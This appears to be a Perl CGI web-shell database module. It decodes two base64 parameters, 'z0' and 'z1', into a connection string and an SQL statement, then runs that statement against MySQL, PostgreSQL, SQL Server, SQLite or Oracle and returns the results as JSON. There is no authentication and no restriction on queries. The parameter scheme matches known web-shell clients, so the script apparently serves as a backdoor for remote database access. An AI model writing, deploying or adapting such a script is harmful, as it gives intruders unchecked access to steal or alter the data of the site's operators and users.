use strict;
use warnings;
use CGI;
use MIME::Base64;
use JSON;
use DBI;
use URI;

sub parse_server_dsn {
    my ($url) = @_;
    my $uri = URI->new($url);
    die "Invalid DSN format" unless $uri && $uri->scheme;

    my $user_info = $uri->userinfo // '';
    my ($user, $pass) = split(/:/, $user_info, 2);

    my $path = $uri->path // '';
    $path =~ s/^\///;

    return {
        driver   => lc($uri->scheme),
        host     => $uri->host // '',
        port     => $uri->port // '',
        database => $path,
        user     => $user // '',
        password => $pass // ''
    };
}

sub parse_file_dsn {
    my ($url) = @_;
    my $content = (split(/:\/\//, $url, 2))[1] // '';
    my @parts = split(/;/, $content);
    my $path = shift @parts;
    my %options;

    for my $item (@parts) {
        if ($item =~ /=/) {
            my ($k, $v) = split(/=/, $item, 2);
            $options{lc(trim($k))} = trim($v);
        }
    }

    return {
        database => $path,
        password => $options{'password'} // $options{'pwd'} // ''
    };
}

sub trim {
    my $s = shift;
    $s =~ s/^\s+//;
    $s =~ s/\s+$//;
    return $s;
}

sub create_dbh {
    my ($url) = @_;
    my ($driver) = lc($url) =~ /^([^:]+)/;
    
    die "Unsupported database type" unless $driver;

    my ($dsn, $user, $pass) = ('', '', '');

    if ($driver eq 'mysql') {
        my $cfg = parse_server_dsn($url);
        $dsn = "DBI:mysql:database=$cfg->{database};host=$cfg->{host};port=$cfg->{port}";
        $user = $cfg->{user};
        $pass = $cfg->{password};
    }
    elsif ($driver eq 'pgsql') {
        my $cfg = parse_server_dsn($url);
        $dsn = "DBI:Pg:dbname=$cfg->{database};host=$cfg->{host};port=$cfg->{port}";
        $user = $cfg->{user};
        $pass = $cfg->{password};
    }
    elsif ($driver eq 'sqlsrv' || $driver eq 'odbc') {
        my $cfg = parse_server_dsn($url);
        $dsn = "DBI:ODBC:Driver={SQL Server};Server=$cfg->{host};Database=$cfg->{database}";
        $user = $cfg->{user};
        $pass = $cfg->{password};
    }
    elsif ($driver eq 'sqlite') {
        my $path = substr($url, 9);
        die "SQLite file not found: $path" unless -e $path;
        $dsn = "DBI:SQLite:dbname=$path";
    }
    elsif ($driver eq 'oracle') {
        my $cfg = parse_server_dsn($url);
        $dsn = "DBI:Oracle:host=$cfg->{host};port=$cfg->{port};sid=$cfg->{database}";
        $user = $cfg->{user};
        $pass = $cfg->{password};
    }
    else {
        die "Unsupported database type: $driver";
    }

    my $dbh = DBI->connect($dsn, $user, $pass, { RaiseError => 1, PrintError => 0, AutoCommit => 1 })
        or die $DBI::errstr;

    return $dbh;
}

sub main {
    my $q = CGI->new;
    my $dsn_url = decode_base64($q->param('z0') // '');
    my $sql     = decode_base64($q->param('z1') // '');

    my $json = JSON->new->utf8;

    eval {
        my $dbh = create_dbh($dsn_url);

        unless ($sql) {
            print $json->encode({
                success => JSON::true,
                message => 'Database connection is OK'
            });
            $dbh->disconnect if $dbh;
            return;
        }

        my $sth = $dbh->prepare($sql);
        $sth->execute();

        my $num_fields = $sth->{NUM_OF_FIELDS};

        if ($num_fields && $num_fields > 0) {
            my @rows;
            while (my $row = $sth->fetchrow_hashref) {
                push @rows, $row;
            }

            print $json->encode({
                success  => JSON::true,
                rowCount => scalar(@rows),
                data     => \@rows
            });
        } else {
            my $rows_affected = $sth->rows;
            print $json->encode({
                success  => JSON::true,
                rowCount => $rows_affected,
                data     => []
            });
        }

        $sth->finish;
        $dbh->disconnect;
        1;
    } or do {
        my $error = $@ || 'Unknown database error';
        $error =~ s/ at .* line \d+.*//s;

        print $json->encode({
            success => JSON::false,
            error   => $error
        });
    };
}

main();